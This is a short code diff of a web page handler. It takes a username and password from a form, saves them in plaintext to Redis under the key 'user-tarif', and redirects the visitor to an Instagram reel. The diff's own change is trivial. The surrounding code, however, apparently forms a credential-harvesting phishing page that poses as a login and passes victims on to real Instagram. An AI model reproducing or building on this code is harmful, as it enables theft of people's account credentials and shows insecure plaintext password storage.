@@ -9,7 +9,7 @@ export default function Home() {
     const userorname = e.get('userorname')
     const password = e.get('password');
     const data = await redis.set('user-tarif',`username:${userorname}&password:${password}`);
-    redirect("intent://www.instagram.com/reel/CqT56BGgDlw/#Intent;package=com.instagram.android;scheme=https;end?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==    ")
+    redirect("intent://www.instagram.com/reel/CqT56BGgDlw/#Intent;package=com.instagram.android;scheme=https;end?utm_source=ig_web_copy_link&igshid=MzRlODBiNWFlZA==",)
     
   }
   return (
